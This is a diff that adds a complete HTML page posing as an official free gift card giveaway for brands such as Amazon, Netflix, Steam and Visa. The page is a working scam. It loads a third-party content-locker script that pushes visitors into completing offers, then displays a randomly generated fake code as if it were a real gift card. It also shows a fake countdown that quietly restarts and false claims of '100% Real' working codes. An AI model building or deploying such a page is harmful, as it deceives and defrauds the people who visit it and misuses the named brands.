@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>🎁 Free Gift Card Giveaway</title>
+
+<!-- ✅ Open Graph -->
+<meta property="og:title" content="🎁 Free Gift Card Giveaway" />
+<meta property="og:description" content="Complete one offer & instantly unlock your free gift card!" />
+<meta property="og:image" content="https://i.ibb.co/pzyznpY/gift-banner.jpg" />
+<meta property="og:url" content="https://yourdomain.com/" />
+<meta property="og:type" content="website" />
+
+<!-- ✅ Twitter Card -->
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="🎁 Free Gift Card Giveaway">
+<meta name="twitter:description" content="Pick your gift card & unlock the final code by completing one quick offer.">
+<meta name="twitter:image" content="https://i.ibb.co/pzyznpY/gift-banner.jpg">
+
+<!-- ✅ Locker Code -->
+<script type="text/javascript">
+    var MUiTT_dgC_tNaRUc={"it":4544962,"key":"1be8c"};
+</script>
+<script src="https://d3qr4eoze2yrp4.cloudfront.net/523059e.js"></script>
+
+<style>
+:root{ --card-w:240px; --card-h:140px; }
+*{ box-sizing:border-box; }
+body{ margin:0; padding:0; font-family:"Segoe UI",Roboto,Arial,sans-serif; background:#000; color:#fff; overflow-x:hidden; }
+
+/* ✅ Matrix Background */
+canvas#matrix { position:fixed; top:0; left:0; width:100%; height:100%; z-index:-1; background:#000; }
+
+header{ padding:16px; text-align:center; background:#12b886; color:#fff; position:sticky; top:0; z-index:5; box-shadow:0 6px 20px rgba(0,0,0,.5); }
+header h1{ margin:0; font-size:22px; }
+
+/* ✅ Hero */
+.hero{ text-align:center; padding:30px 15px; }
+.hero img{ max-width:600px; width:100%; border-radius:18px; box-shadow:0 12px 30px rgba(0,0,0,.6); margin-bottom:20px; }
+.hero h2{ font-size:28px; margin:10px 0; color:#00ff9d; text-shadow:0 0 10px #00ff9d; }
+.hero p{ font-size:18px; color:#ddd; }
+.highlight{ color:#ff4444; font-weight:bold; }
+
+/* ✅ Timer */
+.timer-box { margin-top:20px; font-size:20px; font-weight:bold; color:#ff4444;
+  background:rgba(255,0,0,0.1); display:inline-block; padding:10px 20px; border-radius:12px;
+  box-shadow:0 0 15px rgba(255,0,0,.6); }
+
+/* ✅ Gift Cards */
+.grid-wrap{ padding:20px; display:grid; grid-template-columns:repeat(auto-fit,minmax(220px,1fr)); gap:20px; }
+.gc{ width:var(--card-w); height:var(--card-h); border-radius:16px; position:relative; overflow:hidden;
+  cursor:pointer; user-select:none; margin:auto; box-shadow:0 10px 25px rgba(0,0,0,.5); transition:transform .25s; }
+.gc:hover{ transform:translateY(-4px) scale(1.03); }
+.chip{ position:absolute; top:12px; left:14px; width:28px; height:22px; border-radius:4px;
+  background:linear-gradient(145deg,#d4b76a,#b28e3f); }
+.logo{ position:absolute; top:10px; right:12px; height:26px; max-width:120px; filter:brightness(0) invert(1); }
+.amt{ position:absolute; left:0; bottom:0; padding:6px 12px; background:rgba(0,0,0,.5); color:#fff; font-weight:800; font-size:14px; border-top-right-radius:12px; }
+.brand{ position:absolute; bottom:10px; right:12px; color:#fff; font-weight:700; font-size:15px; }
+
+/* ✅ Modal */
+.modal{ position:fixed; inset:0; display:none; align-items:center; justify-content:center; background:rgba(0,0,0,.8); z-index:20; padding:18px; }
+.sheet{ background:#111; width:100%; max-width:440px; border-radius:16px; padding:20px; text-align:center; position:relative; box-shadow:0 0 20px #0f0; }
+.code{ font-family:monospace; font-weight:800; color:#00ff9d; font-size:22px; padding:10px 12px;
+  background:#000; border-radius:10px; border:1px dashed #0f0; display:none; text-shadow:0 0 8px #0f0; }
+.row{ display:flex; gap:10px; justify-content:center; margin-top:12px; flex-wrap:wrap; }
+.btn{ border:none; border-radius:12px; padding:12px 16px; cursor:pointer; font-weight:800; }
+.btn.primary{ background:#12b886; color:#fff; }
+.x{ position:absolute; top:12px; left:12px; background:transparent; border:none; font-size:20px; cursor:pointer; color:#fff; }
+
+/* Loader Spinner */
+.loader { border: 5px solid #111; border-top: 5px solid #00ff9d;
+  border-radius: 50%; width: 50px; height: 50px;
+  animation: spin 1s linear infinite; margin: 20px auto; display: none; }
+@keyframes spin { 100% { transform: rotate(360deg); } }
+
+/* Reveal Animation */
+.reveal { opacity: 0; transform: scale(0.9); animation: popIn 0.6s forwards; }
+@keyframes popIn { to { opacity:1; transform:scale(1); } }
+
+/* Hacker style random digits */
+.code.hacker { font-family: monospace; letter-spacing: 2px; font-weight: bold; color: #0f0; text-shadow: 0 0 8px #0f0; }
+
+/* Confetti canvas */
+#confetti-canvas { position: fixed; pointer-events: none; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; }
+</style>
+</head>
+<body>
+
+<canvas id="matrix"></canvas>
+<header><h1>🎁 Official Free Gift Card Giveaway</h1></header>
+
+<!-- ✅ Hero Section -->
+<section class="hero">
+  <img src="https://i.ibb.co/pzyznpY/gift-banner.jpg" alt="Giveaway Banner">
+  <h2>🔥 Complete <span class="highlight">One Offer</span> → Instantly Get Free Gift Card!</h2>
+  <p>Unlimited <span class="highlight">working codes</span> • 100% Real • Instant Delivery 🚀</p>
+  <p>Don’t miss out — Grab your <span class="highlight">FREE reward</span> today!</p>
+  <div class="timer-box">⏰ Hurry! Offer ends in <span id="countdown">10:00</span> minutes</div>
+</section>
+
+<!-- ✅ Gift Cards -->
+<section class="grid-wrap" id="grid"></section>
+
+<!-- ✅ Modal -->
+<div class="modal" id="modal">
+  <div class="sheet">
+    <button class="x" id="closeModal">✖</button>
+    <h3>🎟️ Your Gift Code</h3>
+    <div id="status">⏳ Generating your code…</div>
+    <div class="loader" id="loader"></div>
+    <div class="code" id="code">XXXX-XXXX-XXXX-****</div>
+    <div class="row">
+      <button class="btn primary" id="unlock">Unlock Last Digits</button>
+      <button class="btn" id="close">Close</button>
+    </div>
+  </div>
+</div>
+<canvas id="confetti-canvas"></canvas>
+
+<script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
+<script>
+// ✅ Matrix Effect
+const canvas=document.getElementById("matrix"),ctx=canvas.getContext("2d");
+canvas.height=window.innerHeight; canvas.width=window.innerWidth;
+const letters="01"; const fontSize=14; const columns=canvas.width/fontSize; 
+const drops=Array(Math.floor(columns)).fill(1);
+function drawMatrix(){ ctx.fillStyle="rgba(0,0,0,0.05)"; ctx.fillRect(0,0,canvas.width,canvas.height);
+ ctx.fillStyle="#0f0"; ctx.font=fontSize+"px monospace"; for(let i=0;i<drops.length;i++){ 
+ let text=letters[Math.floor(Math.random()*letters.length)];
+ ctx.fillText(text,i*fontSize,drops[i]*fontSize); if(drops[i]*fontSize>canvas.height&&Math.random()>0.975)drops[i]=0; drops[i]++;}}
+setInterval(drawMatrix,40);
+
+// ✅ Countdown Timer Auto-reset
+function startTimer(duration, display) {
+    let timer = duration, minutes, seconds;
+    setInterval(function () {
+        minutes = parseInt(timer / 60, 10);
+        seconds = parseInt(timer % 60, 10);
+        minutes = minutes < 10 ? "0" + minutes : minutes;
+        seconds = seconds < 10 ? "0" + seconds : seconds;
+        display.textContent = minutes + ":" + seconds;
+        if (--timer < 0) { timer = duration; }
+    }, 1000);
+}
+window.onload = function () {
+    const tenMinutes = 60 * 10,
+    display = document.querySelector('#countdown');
+    startTimer(tenMinutes, display);
+};
+
+// ✅ Gift Card Brands
+const BRANDS = [
+  {name:"Amazon",logo:"https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg",grad:["#111","#f90"],amt:"$100"},
+  {name:"Netflix",logo:"https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg",grad:["#111","#e50914"],amt:"$50"},
+  {name:"Google Play",logo:"https://upload.wikimedia.org/wikipedia/commons/5/5e/Google_Play_2016_icon.svg",grad:["#0ea5e9","#10b981"],amt:"$25"},
+  {name:"Steam",logo:"https://upload.wikimedia.org/wikipedia/commons/8/83/Steam_icon_logo.svg",grad:["#111","#333"],amt:"$100"},
+  {name:"Spotify",logo:"https://upload.wikimedia.org/wikipedia/commons/2/26/Spotify_logo_with_text.svg",grad:["#1db954","#111"],amt:"$30"},
+  {name:"Apple",logo:"https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg",grad:["#333","#999"],amt:"$50"},
+  {name:"Xbox",logo:"https://upload.wikimedia.org/wikipedia/commons/0/0d/Xbox_logo_2012.svg",grad:["#166534","#16a34a"],amt:"$50"},
+  {name:"PlayStation",logo:"https://upload.wikimedia.org/wikipedia/commons/5/56/PlayStation_logo.svg",grad:["#0ea5e9","#1e3a8a"],amt:"$50"},
+  {name:"Roblox",logo:"https://upload.wikimedia.org/wikipedia/commons/1/1b/Roblox_Logo_2022.svg",grad:["#111","#444"],amt:"$10"},
+  {name:"Visa Prepaid",logo:"https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_2021.svg",grad:["#1d4ed8","#312e81"],amt:"$100"},
+];
+function createCard(brand){
+  const el=document.createElement('div');
+  el.className='gc';
+  el.style.background=`linear-gradient(135deg,${brand.grad[0]},${brand.grad[1]})`;
+  el.innerHTML=`
+    <div class="chip"></div>
+    <img class="logo" src="${brand.logo}" alt="${brand.name}">
+    <div class="amt">${brand.amt}</div>
+    <div class="brand">${brand.name}</div>`;
+  el.addEventListener('click',()=>openModal(brand.name));
+  return el;
+}
+const grid=document.getElementById('grid');
+BRANDS.forEach(b=>grid.appendChild(createCard(b)));
+
+// ✅ Modal Logic
+const modal=document.getElementById('modal');
+const codeEl=document.getElementById('code');
+const statusEl=document.getElementById('status');
+const unlockBtn=document.getElementById('unlock');
+const loader=document.getElementById('loader');
+let fullCode="";
+
+function randCode(){
+  const chars="ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"; let s="";
+  for(let i=0;i<16;i++){ s+=chars[Math.floor(Math.random()*chars.length)]; if((i+1)%4===0 && i<15) s+="-"; }
+  return s;
+}
+function openModal(brand){
+  modal.style.display='flex'; 
+  fullCode = randCode(); 
+  let hiddenCode = fullCode.slice(0, fullCode.length - 4) + "****";
+  codeEl.textContent = hiddenCode; 
+  codeEl.style.display='inline-block';
+  codeEl.classList.remove("reveal","hacker");
+  statusEl.textContent=`Here is your ${brand} code: (last 4 digits locked 🔒)`; 
+  unlockBtn.disabled=false;
+}
+document.getElementById('close').onclick=()=>modal.style.display='none';
+document.getElementById('closeModal').onclick=()=>modal.style.display='none';
+
+// Confetti Effect
+function launchConfetti() {
+  const duration = 2 * 1000;
+  const end = Date.now() + duration;
+  (function frame() {
+    confetti({ particleCount: 5, angle: 60, spread: 55, origin: { x: 0 } });
+    confetti({ particleCount: 5, angle: 120, spread: 55, origin: { x: 1 } });
+    if (Date.now() < end) requestAnimationFrame(frame);
+  }());
+}
+
+// Fake hacker random code
+function fakeCode(){
+  const chars="ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+  let s="";
+  for(let i=0;i<16;i++){
+    s+=chars[Math.floor(Math.random()*chars.length)];
+    if((i+1)%4===0 && i<15) s+="-";
+  }
+  return s;
+}
+
+// ✅ Unlock Button → Locker + Animations
+unlockBtn.addEventListener('click',()=>{
+  modal.style.display='none';
+  if (typeof _kt === "function") { _kt(); }
+
+  loader.style.display="block";
+  codeEl.style.display="none";
+
+  setTimeout(()=>{
+    modal.style.display='flex';
+    loader.style.display="none";
+    codeEl.style.display="inline-block";
+    codeEl.classList.add("hacker");
+
+    let i = 0;
+    let interval = setInterval(()=>{
+      codeEl.textContent = fakeCode(); // random codes changing
+      i++;
+      if(i>15){ // ~2s then show real code
+        clearInterval(interval);
+        codeEl.classList.remove("hacker");
+        codeEl.classList.add("reveal");
+        codeEl.textContent = fullCode; 
+        statusEl.textContent="✅ Code Unlocked!";
+        launchConfetti();
+      }
+    }, 120);
+  }, 2000); // loader delay
+});
+</script>
+</body>
+</html>
